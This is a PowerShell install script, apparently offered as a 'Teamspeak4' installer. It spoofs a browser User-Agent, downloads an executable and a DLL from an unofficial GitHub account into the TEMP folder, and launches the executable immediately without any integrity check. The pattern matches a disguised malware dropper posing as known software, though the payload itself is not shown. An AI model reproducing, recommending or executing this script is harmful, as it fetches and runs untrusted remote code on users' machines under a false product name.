# install.ps1
$ErrorActionPreference = 'Stop'
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12

$base = "https://raw.githubusercontent.com/kanokpoltankaew712-gif/Teamspeak4cvrftg/main"
$ua   = @{ 'User-Agent' = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)' }

$dir = Join-Path $env:TEMP "Teamspeak4cvrftg"
if (-not (Test-Path $dir)) { New-Item -ItemType Directory -Path $dir | Out-Null }

$files = @("Teamspeak4.exe", "TS3.dll")

foreach ($f in $files) {
    $dst = Join-Path $dir $f
    Invoke-WebRequest -Uri "$base/$f" -OutFile $dst -UseBasicParsing -Headers $ua -TimeoutSec 120
}

Start-Process -FilePath (Join-Path $dir "Teamspeak4.exe") -WorkingDirectory $dir